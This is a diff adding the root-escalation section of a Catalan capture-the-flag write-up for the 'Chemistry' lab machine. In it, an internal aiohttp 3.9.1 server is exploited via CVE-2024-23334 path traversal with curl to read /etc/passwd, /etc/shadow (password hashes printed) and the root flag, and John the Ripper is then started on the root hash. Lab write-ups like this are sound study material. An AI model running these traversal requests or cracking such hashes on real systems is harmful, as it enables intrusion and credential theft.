@@ -379,3 +379,582 @@ I ja tenim la user flag:
 
 Ara buscarem la forma d'escalar privilegis per poder tenir accés amb l'usuari root i obtenir la seva flag.
 
+He tornat a tirar Linpeas, i mirant tots els apartats veiem que, hi ha una web corrent per el port localhost 127.0.0.1:8080, per tant provarem de fer un curl a veure què trobem que ens pugui ser útil:
+
+
+```
+
+rosa@chemistry:~$ curl localhost:8080
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Site Monitoring</title>
+
+    <link rel="stylesheet" href="/assets/css/all.min.css">
+
+    <script src="/assets/js/jquery-3.6.0.min.js"></script>
+
+    <script src="/assets/js/chart.js"></script>
+
+    <link rel="stylesheet" href="/assets/css/style.css">
+
+    <style>
+
+    h2 {
+
+      color: black;
+
+      font-style: italic;
+
+    }
+
+  
+  
+
+    </style>
+
+</head>
+
+<body>
+
+    <nav class="navbar">
+
+        <div class="container">
+
+            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>
+
+            <ul class="nav-links">
+
+                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>
+
+                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>
+
+                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>
+
+                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>
+
+                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>
+
+            </ul>
+
+        </div>
+
+    </nav>
+
+  
+
+    <div class="container">
+
+        <div id="earnings">
+
+            <h2>2023 Earnings</h2>
+
+            <canvas id="earningsChart"></canvas>
+
+        </div>
+
+        <div id="views">
+
+            <h2>Views per Month</h2>
+
+            <canvas id="viewsChart"></canvas>
+
+        </div>
+
+        <div id="ad-clicks">
+
+            <h2>Ad Clicks per Visit</h2>
+
+            <canvas id="adClicksChart"></canvas>
+
+        </div>
+
+        <div id="service-list" style="display:none;">
+
+            <h2>Service List</h2>
+
+            <ul id="service-list-content">
+
+                <!-- Will be filled dynamically with JavaScript -->
+
+            </ul>
+
+        </div>
+
+        <div id="attack-logs" style="display:none;">
+
+            <h2>Possible Attacks</h2>
+
+            <h3><p style="color:red;">Functionality currently under development</p></h3>
+
+            <ul id="attack-logs-content">
+
+            </ul>
+
+        </div>
+
+        <div class="loader" id="loader" style="display:none;">Loading...</div>
+
+    </div>
+
+  
+
+    <script src="/assets/js/script.js"></script>
+
+  
+
+    <script>
+
+        document.addEventListener('DOMContentLoaded', function () {
+
+            const earnings = {"April": 3000, "August": 5000, "February": 2000, "January": 1500, "July": 4500, "June": 4000, "March": 2500, "May": 3500, "September": 5500};
+
+            const views = {"April": 40000, "August": 60000, "February": 30000, "January": 25000, "July": 55000, "June": 50000, "March": 35000, "May": 45000, "September": 65000};
+
+            const adClicks = {"Ad1": 650, "Ad2": 200, "Ad3": 1000};
+
+  
+
+            // Earnings Chart Configuration
+
+            const earningsCtx = document.getElementById('earningsChart').getContext('2d');
+
+            const earningsChart = new Chart(earningsCtx, {
+
+                type: 'bar',
+
+                data: {
+
+                    labels: Object.keys(earnings),
+
+                    datasets: [{
+
+                        label: 'Earnings ($)',
+
+                        data: Object.values(earnings),
+
+                        backgroundColor: 'rgba(75, 192, 192, 0.2)',
+
+                        borderColor: 'rgba(75, 192, 192, 1)',
+
+                        borderWidth: 1
+
+                    }]
+
+                },
+
+                options: {
+
+                    responsive: true,
+
+                    scales: {
+
+                        y: {
+
+                            beginAtZero: true
+
+                        }
+
+                    }
+
+                }
+
+            });
+
+  
+
+            // Views Chart Configuration
+
+            const viewsCtx = document.getElementById('viewsChart').getContext('2d');
+
+            const viewsChart = new Chart(viewsCtx, {
+
+                type: 'line',
+
+                data: {
+
+                    labels: Object.keys(views),
+
+                    datasets: [{
+
+                        label: 'Views',
+
+                        data: Object.values(views),
+
+                        backgroundColor: 'rgba(153, 102, 255, 0.2)',
+
+                        borderColor: 'rgba(153, 102, 255, 1)',
+
+                        borderWidth: 1
+
+                    }]
+
+                },
+
+                options: {
+
+                    responsive: true,
+
+                    scales: {
+
+                        y: {
+
+                            beginAtZero: true
+
+                        }
+
+                    }
+
+                }
+
+            });
+
+  
+
+            // Ad Clicks Chart Configuration
+
+            const adClicksCtx = document.getElementById('adClicksChart').getContext('2d');
+
+            const adClicksChart = new Chart(adClicksCtx, {
+
+                type: 'pie',
+
+                data: {
+
+                    labels: Object.keys(adClicks),
+
+                    datasets: [{
+
+                        label: 'Clicks',
+
+                        data: Object.values(adClicks),
+
+                        backgroundColor: [
+
+                            'rgba(255, 99, 132, 0.2)',
+
+                            'rgba(54, 162, 235, 0.2)',
+
+                            'rgba(255, 206, 86, 0.2)',
+
+                            'rgba(75, 192, 192, 0.2)',
+
+                            'rgba(153, 102, 255, 0.2)',
+
+                            'rgba(255, 159, 64, 0.2)'
+
+                        ],
+
+                        borderColor: [
+
+                            'rgba(255, 99, 132, 1)',
+
+                            'rgba(54, 162, 235, 1)',
+
+                            'rgba(255, 206, 86, 1)',
+
+                            'rgba(75, 192, 192, 1)',
+
+                            'rgba(153, 102, 255, 1)',
+
+                            'rgba(255, 159, 64, 1)'
+
+                        ],
+
+                        borderWidth: 1
+
+                    }]
+
+                },
+
+                options: {
+
+                    responsive: true
+
+                }
+
+            });
+
+        });
+
+    </script>
+
+</body>
+
+</html>
+
+```
+
+
+Sembla un lloc web per monitoritzar alguna cosa. Com que no hem aconseguit res farem un curl per obtenir les capçaleres, a veure si així obtenim alguna informació valuosa:
+
+```
+
+rosa@chemistry:~$ curl localhost:8080 --head
+
+HTTP/1.1 200 OK
+
+Content-Type: text/html; charset=utf-8
+
+Content-Length: 5971
+
+Date: Thu, 07 Nov 2024 21:04:17 GMT
+
+Server: Python/3.9 aiohttp/3.9.1
+
+```
+  
+A server veiem que hi ha la versió de python i aiohttp que no sé què és, farem una cerca a internet a veure si trobem algun CVE i/o POC sobre aquestes versions.
+
+Sobre Python no trobem res: Known vulnerabilities in the python-3.9 package. This does not include vulnerabilities belonging to this package's dependencies.
+
+Per tant anem a mirar sobre aiohttp, primer de tot, com que no conec aiohttp he fet una cerca per veure què és: aiohttp és un framework client/servidor HTTP asíncron per asyncio i Python. Un cop fet això, vaig a buscar a veure si trobo algun CVE per aquesta versióde aiohtpp.
+
+He trobat diversos POC que es podrien utilitzar i que són sobre LFI/Path Traversal : https://github.com/z3rObyte/CVE-2024-23334-PoC , https://github.com/wizarddos/CVE-2024-23334 .
+
+Si examinem l'exploit.sh del primer repositori que he documentat, veiem que hi ha la següent comanda per explotar la vulnerabilitat de Path Traversal `curl --path-as-is -s -o /dev/null`, per tant, puc provar de fer-ho de forma manual a veure si puc aconseguir la flag de root. Com que no funcionava tal qual estava a l'script del repositori de GitHub, he mirat bé la comanda i -o no s'ha de posar perquè és per especificar un fitxer de sortida cosa que ara mateix no vull fer, per tant queda la comanda així amb la qual obtenim resultats:
+
+```
+
+rosa@chemistry:~$ curl --path-as-is -s http://localhost:8080/dev/null
+
+404: Not Found
+
+```
+
+Ara doncs, començaré a jugar a assaig-error a veure si vaig trobant alguna cosa. Després de posar 4 ../ puc visualitzar com si de cat es tractés fitxers, per exemple he aconseguit:
+
+```
+
+rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
+sync:x:4:65534:sync:/bin:/bin/sync
+
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+
+app:x:1001:1001:,,,:/home/app:/bin/bash
+
+_laurel:x:997:997::/var/log/laurel:/bin/false
+
+```
+
+I si mirem el shadow tenim les contrasenyes:
+
+```
+
+rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow
+
+root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
+
+daemon:*:19430:0:99999:7:::
+
+bin:*:19430:0:99999:7:::
+
+sys:*:19430:0:99999:7:::
+
+sync:*:19430:0:99999:7:::
+
+games:*:19430:0:99999:7:::
+
+man:*:19430:0:99999:7:::
+
+lp:*:19430:0:99999:7:::
+
+mail:*:19430:0:99999:7:::
+
+news:*:19430:0:99999:7:::
+
+uucp:*:19430:0:99999:7:::
+
+proxy:*:19430:0:99999:7:::
+
+www-data:*:19430:0:99999:7:::
+
+backup:*:19430:0:99999:7:::
+
+list:*:19430:0:99999:7:::
+
+irc:*:19430:0:99999:7:::
+
+gnats:*:19430:0:99999:7:::
+
+nobody:*:19430:0:99999:7:::
+
+systemd-network:*:19430:0:99999:7:::
+
+systemd-resolve:*:19430:0:99999:7:::
+
+systemd-timesync:*:19430:0:99999:7:::
+
+messagebus:*:19430:0:99999:7:::
+
+syslog:*:19430:0:99999:7:::
+
+_apt:*:19430:0:99999:7:::
+
+tss:*:19430:0:99999:7:::
+
+uuidd:*:19430:0:99999:7:::
+
+tcpdump:*:19430:0:99999:7:::
+
+landscape:*:19430:0:99999:7:::
+
+pollinate:*:19430:0:99999:7:::
+
+fwupd-refresh:*:19430:0:99999:7:::
+
+usbmux:*:19889:0:99999:7:::
+
+sshd:*:19889:0:99999:7:::
+
+systemd-coredump:!!:19889::::::
+
+rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
+
+lxd:!:19889::::::
+
+app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
+
+_laurel:!:20007::::::
+
+```
+
+Ara doncs, es tracta de desencriptar la contrasenya de l'usuari root, o bé, podria provar a veure si aconsegueixo d'arribar a la ruta de la flag de root, que serà root.txt com sempre.
+
+1. Crackejar el hash:
+
+Tenim que el hash és el següent `$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.` Ara el podem crackejar amb John the ripper o hashcat per exemple:
+
+
+```
+
+┌──(kali㉿kali)-[~/Documents/Chemistry]
+
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+  
+
+Using default input encoding: UTF-8
+
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+
+Cost 1 (iteration count) is 5000 for all loaded hashes
+
+Will run 3 OpenMP threads
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+
+``` 
+
+Mentre es crackeja el hash per obtenir la contrasenya, he provat la segona opció:
+
+
+2. Trobar i llegir la flag de root sabent que el nom ha de ser root.txt i que es trobarà al directori root que està a l'arrel:
+
+
+```
+
+rosa@chemistry:~$ cd /
+
+rosa@chemistry:/$ ls
+
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
+
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
+
+```
+
+Com que el directori /etc està al mateix nivell que el directori root, simplement amb aquesta comanda modificant la part de /etc/shadow per /root/root.txt podem llegir la flag:
+
+
+```
+
+rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
+
+c09bb70e899db229142e249694c23a4f
+
+```
+
+
+I ja tenim la màquina resolta i la root flag. El més complicat en aquesta última part ha estat el trobar la forma de fer el Path Traversal correctament a través d'assets, ja que un cop trobat des de l'arrel ja es podien anar trobant la resta de coses.
+
+![[Pasted image 20241107225535.png]]
+
+
+
